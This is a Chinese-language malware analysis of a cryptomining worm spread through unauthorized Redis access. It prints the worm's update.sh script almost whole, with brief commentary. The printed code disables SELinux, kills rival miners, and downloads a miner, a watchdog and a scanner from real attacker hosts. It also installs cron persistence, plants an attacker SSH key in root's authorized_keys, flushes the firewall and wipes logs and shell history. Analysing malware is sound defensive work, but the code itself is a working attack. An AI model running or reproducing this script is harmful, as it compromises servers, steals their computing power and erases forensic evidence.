Redis因配置不当可以导致未授权访问，被攻击者恶意利用。如果Redis以root身份运行，在root用户密码被暴力破解后或者没有开启认证时，会直接导致Redis服务暴露在公网，直接通过SSH登录受害服务器，Redis未授权访问后下载病毒核心脚本update.sh



```
#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
```


首先关闭SELINUX防火墙，释放更多内存用于挖矿



```
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/sysupdates
rtdir="/etc/sysupdates"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cur"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wge"

mv /usr/bin/wget /usr/bin/get
mv /usr/bin/xget /usr/bin/get
mv /usr/bin/get /usr/bin/wge
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/xurl /usr/bin/url
mv /usr/bin/url /usr/bin/cur
```

将一些命令和文件地址定义为变量，并且将一些机器中的地址转移到程序定义的地址中，方便程序利用。



```
miner_url="https://de.gsearch.com.de/api/sysupdate"
miner_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysupdate"
miner_size="854364"
sh_url="https://de.gsearch.com.de/api/update.sh"
sh_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/update.sh"
config_url="https://de.gsearch.com.de/api/config.json"
config_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/config.json"
config_size="4954"
scan_url="https://de.gsearch.com.de/api/networkservice"
scan_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/networkservice"
scan_size="2584072"
watchdog_url="https://de.gsearch.com.de/api/sysguard"
watchdog_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysguard"
watchdog_size="1929480"
```

挖矿病毒程序的下载地址，以及文件的大小



```
kill_miner_proc()
{
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
	    pkill -f sysguard
		    pkill -f sysupdate
			    pkill -f networkservice
    crontab -r
    rm -rf /var/spool/cron/*
}
```

通过搜索其他挖矿程序木马名称，然后kill -9删除下载进程；通过pkill -f直接删除运行中的挖矿进程



```
downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cur" ]
    then
        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cur --connect-timeout 10 --retry 100 $1 > $2
        else
            cur --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	    then
		    wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wge" ]
    then
        wge --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wge --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}
```

下载该病毒的程序，在bbdir/bbdira中，返回200（成功）后，先下载第一个网址参数，再下载第二个网址参数，返回405（Method Not Allowed）时同理，换为GET；其他从第三个网址参数下载。在ccdir/ccdira中，则由返回结果是否为0，决定下载参数



```
kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "sysguard|update.sh|sysupdate|networkservice"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
```

杀死除本体以外的占用40%以上内存的程序



```
kill_miner_proc
kill_sus_proc
```

调用以上函数



```
if [ -f "$rtdir" ]
    then
        echo "i am root"
        echo "goto 1" >> /etc/sysupdate
        chattr -i /etc/sysupdate*
        chattr -i /etc/config.json*
        chattr -i /etc/update.sh*
        chattr -i /root/.ssh/authorized_keys*
	    chattr -i /etc/networkservice
	if [ ! -f "/usr/bin/crontab" ]
		then 
			echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1" >> ${crondir}
		else
			[[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /etc/update.sh >/dev/null 2>&1") | crontab -
	fi
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17" >> /root/.ssh/authorized_keys
        
        cfg="/etc/config.json"
        file="/etc/sysupdate"


```

取得root权限后，将下载的挖矿木马文件设为可以修改，接着使用crontab命令每三十分钟运行一次update.sh脚本。然后是配置.ssh/authorized_keys，将本地ssh公钥复制到远程服务器的.ssh/authorized_keys中，即可免密登录。



	   if [-f "/etc/config.json" ]
	   then
		     filesize_config=`ls -l /etc/config.json | awk '{ print $5 }'`
		     if [ "$filesize_config" -ne "$config_size" ]	
		     then
	              pkill -f sysupdate
			      rm /etc/config.json
	              downloads $config_url /etc/config.json $config_url_backup
		     else
			      echo "no need download"
		     fi
	    else
		     downloads $config_url /etc/config.json $config_url_backup
	    fi
	
	    if [ -f "/etc/sysupdate" ]
	    then
	         filesize1=`ls -l /etc/sysupdate | awk '{ print $5 }'`
	         if [ "$filesize1" -ne "$miner_size" ] 
	         then
	              pkill -f sysupdate
	              rm /etc/sysupdate
	              downloads $miner_url /etc/sysupdate $miner_url_backup
	          else
	              echo "not need download"
	          fi
	    else
	          downloads $miner_url /etc/sysupdate $miner_url_backup
	    fi
	
	    if [ -f "/etc/sysguard" ]
	    then
	            filesize1=`ls -l /etc/sysguard | awk '{ print $5 }'`
	            if [ "$filesize1" -ne "$watchdog_size" ] 
	            then
	                pkill -f sysguard
	                rm /etc/sysguard
	                downloads $watchdog_url /etc/sysguard $watchdog_url_backup
	            else
	                echo "not need download"
	            fi
	    else
	            downloads $watchdog_url /etc/sysguard $watchdog_url_backup
	    fi
	
	    downloads $sh_url /etc/update.sh $sh_url_backup
	
	    if [ -f "/etc/networkservice" ]
	    then
	            filesize2=`ls -l /etc/networkservice | awk '{ print $5 }'`
	            if [ "$filesize2" -ne "$scan_size" ] 
	            then
	                pkill -f networkservice
	                rm /etc/networkservice
	                downloads  $scan_url /etc/networkservice $scan_url_backup
	            else
	                echo "not need download"
	            fi
	    else
	            downloads $scan_url /etc/networkservice $scan_url_backup
	    fi
在下载了配置文件config.json、挖矿木马程序sysupdate、守护程序sysguard、网络连接程序networkservice后，通过ls -l命令的第五个参数得到文件大小，然后与挖矿路径得到的config_size等参数对比完整性，是否需要重新下载。



```
    ps -fe|grep sysupdate |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmp runing"
                cd /tmp
                chmod 777 sysupdate
                sleep 5s
                ./sysupdate &
            else
                echo "tmp runing....."
        fi
	ps -fe|grep networkservice |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 networkservice
                sleep 5s
                ./networkservice &
            else
                echo "tmps runing....."
        fi

    ps -fe|grep sysguard |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmps runing"
                cd /tmp
                chmod 777 sysguard
                sleep 5s
                ./sysguard &
            else
                echo "tmps runing....."
        fi
```

查看sysupdate、networkservice、sysguard进程，若不在运行则启动程序



```
    chmod 777 /tmp/sysupdate
    chattr +i /tmp/sysupdate
	chmod 777 /tmp/networkservice
	chattr +i /tmp/networkservice
	chmod 777 /tmp/sysguard
	chattr +i /tmp/sysguard
    chmod 777 /tmp/update.sh
    chattr +i /tmp/update.sh
    chmod 777 /tmp/config.json
    chattr +i /tmp/config.json
        
fi
```

将木马程序加锁并赋予权限，防止被删除



```
iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
iptables -I INPUT -s 43.245.222.57 -j DROP
service iptables reload
```

清空原有防火墙的规则，接着禁止部分端口和43.245.222.57访问



```
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
```

停止挖矿程序stratum，清空历史命令以及文件